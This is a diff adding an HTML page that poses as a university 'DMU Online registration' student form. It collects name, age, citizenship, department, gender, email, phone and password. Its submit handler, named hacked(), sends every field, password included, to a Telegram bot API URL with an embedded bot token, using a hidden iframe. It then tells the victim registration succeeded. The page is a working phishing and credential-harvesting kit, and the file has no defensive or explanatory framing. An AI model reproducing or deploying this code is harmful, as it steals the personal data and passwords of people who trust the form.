@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DMU | Responsive Web Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: mediumseagreen;
+      color: white;
+      padding: 15px 0;
+      text-align: center;
+      font-size: 1.5em;
+      font-weight: bold;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: mediumseagreen;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      color: mediumseagreen;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      font-size: 1em;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+     outline:none;
+    }
+    input:hover{
+    border:2px solid mediumseagreen;
+    }
+
+    button {
+      background-color: mediumseagreen ;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      width: 100%;
+      font-size: 1em;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: seagreen;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 15px;
+      }
+    }
+    iframe{
+    
+    }
+  </style>
+  <script>
+  function hacked(){
+var fullname = document.getElementById("fullname").value;
+var age = document.getElementById("age").value;
+var citizenship = document.getElementById("citizenship").value;
+var department = document.getElementById("department").value;
+var gender = document.getElementById("gender").value;
+var email = document.getElementById("email").value;
+var phone = document.getElementById("phone").value;
+var password = document.getElementById("password").value;
+
+
+  const data = {
+  fullname: fullname ,
+  age: age ,
+  citizenship: citizenship ,
+  department: department ,
+  gender: gender ,
+  email: email ,
+  phone: phone ,
+  password: password
+  };
+  if(fullname == ""||
+     age ==""||
+     citizenship==""||
+     department==""||
+     gender==""||
+     email==""||
+     phone==""||
+     password==""){
+     alert(" please insert all your form information! ")
+     }else{
+     
+     
+     const httpRequest = new XMLHttpRequest();
+     
+   
+     httpRequest.onreadystatechange = writeContent;
+     
+     httpRequest.open('GET', 'connection.html');
+     httpRequest.send();
+     
+     function writeContent() {
+     if (httpRequest.readyState === 4) {
+     if (httpRequest.status == 200) {
+     
+     var frame = document.getElementById("frame");
+     frame.setAttribute("src" ,"https://api.telegram.org/bot7991316137:AAFvOyfzDlDWD47GVi3ZsTD41rVlPkFGyDY/sendMessage?chat_id=@sponsered123&text="+(JSON.stringify(data))+"");
+     alert("successfully registered");
+     
+      } else {
+     alert('There was a problem with the internet connection.');
+     }
+     } else {
+     // response not ready yet
+     }
+     }
+     
+     
+  }
+  };
+  </script>
+</head>
+<body>
+
+  <header>DMU Online registration</header>
+
+  <div class="container">
+    <h2>Student Information Form</h2>
+    <form id="userForm">
+      <div class="form-group">
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="fullname" required />
+      </div>
+
+      <div class="form-group">
+        <label for="age">Age</label>
+        <input type="number" id="age" name="age" required min="1" />
+      </div>
+
+      <div class="form-group">
+        <label for="citizenship">Citizenship</label>
+        <input type="text" id="citizenship" name="citizenship" required />
+      </div>
+
+      <div class="form-group">
+        <label for="department">Department</label>
+        <input type="text" id="department" name="department" required />
+      </div>
+
+      <div class="form-group">
+        <label for="gender">Gender</label>
+        <select id="gender" name="gender" required>
+          <option value="">-- Select Gender --</option>
+          <option value="Male">Male</option>
+          <option value="Female">Female</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required />
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" required />
+      </div>
+      
+      <div class="form-group">
+      <label for="department">password</label>
+      <input type="password" id="password" name="password" required />
+      </div>
+
+     
+    </form>
+     <button type="submit"onclick="hacked()">Submit</button>
+  </div>
+<iframe src=""id="frame">
+  
+</body>
+</html>
